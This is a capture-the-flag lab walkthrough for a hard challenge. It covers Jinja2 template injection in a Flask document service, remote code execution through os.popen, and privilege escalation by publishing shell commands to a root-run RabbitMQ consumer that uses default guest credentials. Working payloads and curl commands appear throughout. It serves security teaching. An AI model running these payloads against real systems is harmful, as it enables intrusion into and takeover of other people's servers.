# AM-05: The Archive — Player Walkthrough

> **Difficulty:** Hard
> **Services:** SSH (port 22), HTTPS document service (port 8443), RabbitMQ (port 5672)
> **Flags:** User flag + Root flag
> **Skills learned:** Server-Side Template Injection (SSTI), remote code execution via web frameworks, message queue (RabbitMQ) exploitation, lateral privilege escalation via internal services

This is a **two-container** challenge. You'll exploit a Flask web application via SSTI, discover and abuse a RabbitMQ message queue, and use an internal consumer service to read the root flag. This walkthrough teaches you about modern web exploitation and message queue attacks.

---

## Prerequisites

- A Kali Linux VM with nmap, curl, and Python 3 installed
- The target running (dev: `2225` for SSH, `8443` for HTTPS, `5672` for RabbitMQ; production: `10.10.1.50`)
- Understanding of basic web exploitation (from AM-01 through AM-04)

---

## Stage 1 — Reconnaissance

```bash
nmap -sV -sC localhost
```

**Expected output (dev ports):**
```
2225/tcp open  ssh     OpenSSH
8443/tcp open  ssl/http Flask (document service)
5672/tcp open  amqp    RabbitMQ
```

**What we learned:** Three services:
- **Port 8443:** A Flask web application over HTTPS — this is our entry point
- **Port 5672:** RabbitMQ — a message queue service (AMQP protocol). We might use this later
- **Port 2225:** SSH — we'll need credentials or a key

---

## Stage 2 — Exploring the Document Service

**Goal:** Find the vulnerability in the Flask web application.

Browse the document service (use `-k` to ignore the self-signed certificate):

```bash
curl -sk https://localhost:8443/
```

**Expected output:** An "Archive Document Portal" with an upload/render form. The form lets you submit content that gets rendered and displayed.

Let's test for **SSTI (Server-Side Template Injection)**:

```bash
curl -sk -X POST -d 'content={{ 7*7 }}' https://localhost:8443/upload
```

**Expected output:**
You should see "Your document has been rendered.  Processing is noted.  49"
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Document Processed — The Archive</title>
  <style>
    body { background:#0a0a0a; color:#00ff41; font-family:'Courier New',monospace; margin:0; padding:2rem; }
    .box { max-width:640px; margin:2rem auto; border:1px solid #00ff41; padding:2rem; }
    h1 { font-size:1.1rem; letter-spacing:0.1em; }
    pre { background:#111; padding:1rem; border:1px solid #00ff41; white-space:pre-wrap; word-wrap:break-word; }
    a { color:#00ff41; }
  </style>
</head>
<body>
  <div class="box">
    <h1>DOCUMENT PROCESSED</h1>
    <p>Your document has been rendered. Processing is noted.</p>
    <pre>49</pre>
    <p><a href="/">&lt; Submit another document</a></p>
  </div>
</body>
</html>

```

**What is SSTI?** Server-Side Template Injection is a vulnerability where user input is rendered as a template expression by the server. If you enter `{{ 7*7 }}` and the server returns `49`, it evaluated your input as code. Flask uses the **Jinja2** template engine, and `{{ }}` is its expression syntax. If user input is passed to `render_template_string()` without sanitization, an attacker can execute arbitrary Python code.

---

## Stage 3 — Remote Code Execution via SSTI

**Goal:** Turn the template injection into full command execution.

Jinja2 SSTI allows accessing Python's built-in functions through the template's context. Here's a payload that accesses the `os` module and runs a system command:

```bash
curl -sk -X POST --data-urlencode 'content={{ config.__class__.__init__.__globals__["os"].popen("id").read() }}' https://localhost:8443/upload
```

**Expected output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**How this payload works:**
- `config` — a Flask object available in the template context
- `.__class__.__init__.__globals__` — traverses Python's object model to access global namespace
- `["os"]` — retrieves the `os` module from the globals
- `.popen("id").read()` — runs the `id` command and reads the output

**We have RCE!** Now let's get the user flag:

```bash
curl -sk -X POST --data-urlencode 'content={{ config.__class__.__init__.__globals__["os"].popen("cat /home/archivist/user.txt").read() }}' https://localhost:8443/upload
```

**Expected output:**
```
DZ{user_archive_PLACEHOLDER}
```

---

## Stage 4 — Discovering RabbitMQ

**Goal:** Find the message queue service and understand how it can help us escalate.

RabbitMQ on port 5672 uses default credentials (`guest`/`guest`). By default, RabbitMQ only allows `guest` to connect from localhost — but this instance has been misconfigured to allow connections from any host.

Check if RabbitMQ is accessible:

```bash
curl -sk -X POST --data-urlencode 'content={{ config.__class__.__init__.__globals__["os"].popen("rabbitmqctl status 2>&1").read() }}' https://localhost:8443/upload
```

**Expected output:** Status output confirming RabbitMQ is running.

**Why RabbitMQ matters:** There's an internal "consumer" service that:
1. Listens on a RabbitMQ queue called `archive_commands`
2. Executes any command it receives as a message
3. Runs as **root**

If we can send a message to that queue, the consumer will execute our command as root.

---

## Stage 5 — MQ Injection (Root Flag)

**Goal:** Send a command to the RabbitMQ queue that makes the root-running consumer write the root flag to a shared location.

We need to use `pika` (a Python AMQP client library) on the target to send a message to the `archive_commands` queue. The SSTI runs as `www-data`, which can't write to the default pip install location (`/var/www/` doesn't exist). We work around this by installing pika to a temp directory with `--target` and setting `PYTHONPATH` when running the script. Both steps happen via the SSTI in a single command:

```bash
# Install pika to a temp dir AND send the MQ message in one shot:
curl -sk -X POST --data-urlencode 'content={{ config.__class__.__init__.__globals__["os"].popen("TMPDIR=$(mktemp -d); pip3 install --target=$TMPDIR pika 2>&1; PYTHONPATH=$TMPDIR python3 -c \"import pika; c=pika.BlockingConnection(pika.ConnectionParameters(\\\"localhost\\\",5672,credentials=pika.PlainCredentials(\\\"guest\\\",\\\"guest\\\")));ch=c.channel();ch.queue_declare(queue=\\\"archive_commands\\\");ch.basic_publish(exchange=\\\"\\\",routing_key=\\\"archive_commands\\\",body=\\\"cat /root/root.txt > /shared_archive/root_flag.txt; chmod 444 /shared_archive/root_flag.txt\\\");c.close()\"").read() }}' https://localhost:8443/upload
```

> **Why `--target` and `PYTHONPATH`?** The Flask app (and thus the SSTI) runs
> as `www-data`. A bare `pip3 install pika` fails with `Permission denied:
> '/var/www'` because `www-data`'s `HOME` is `/var/www/` (which doesn't
> exist). Installing to a temp directory with `--target=$TMPDIR` and pointing
> `PYTHONPATH` there lets `www-data` import pika without root or a writable
> home directory.

**What this command does:**
1. Creates a temp directory and installs pika there (`pip3 install --target`)
2. Connects to RabbitMQ on localhost with guest/guest credentials
3. Declares the `archive_commands` queue
4. Publishes a message: `cat /root/root.txt > /shared_archive/root_flag.txt; chmod 444 /shared_archive/root_flag.txt`
5. The root-running consumer receives the message, executes the command, and writes the root flag to the shared volume

Now read the root flag from the shared location:

```bash
curl -sk -X POST --data-urlencode 'content={{ config.__class__.__init__.__globals__["os"].popen("cat /shared_archive/root_flag.txt").read() }}' https://localhost:8443/upload
```

**Expected output:**
```
DZ{root_archive_PLACEHOLDER}
```

---

## Summary

| Step | Technique | What we did |
|------|-----------|-------------|
| 1 | Nmap enumeration | Found HTTPS (8443), RabbitMQ (5672), SSH (22) |
| 2 | SSTI discovery | Tested `{{ 7*7 }}` — server returned 49 |
| 3 | SSTI RCE | Accessed `os.popen()` via Jinja2 globals, got RCE |
| 4 | Service discovery | Found RabbitMQ with default creds (guest/guest) |
| 5 | MQ injection | Sent a command to the root-running consumer via RabbitMQ |

**Key takeaways:**
- **SSTI is a powerful web vulnerability.** `{{ 7*7 }}` is your first test. If it evaluates, you own the server.
- **Python object traversal gives you RCE.** Learn the `__class__.__init__.__globals__` chain — it works in most Flask/Jinja2 SSTI scenarios.
- **Message queues can be attack vectors.** RabbitMQ with default credentials (`guest`/`guest`) is a common misconfiguration.
- **Internal services run as different users.** Even if your web shell is low-privilege, an internal service running as root can be abused to read protected files.
- **Shared volumes bridge containers.** The consumer writes to a shared volume that the archive container can read — that's how we get the flag back.
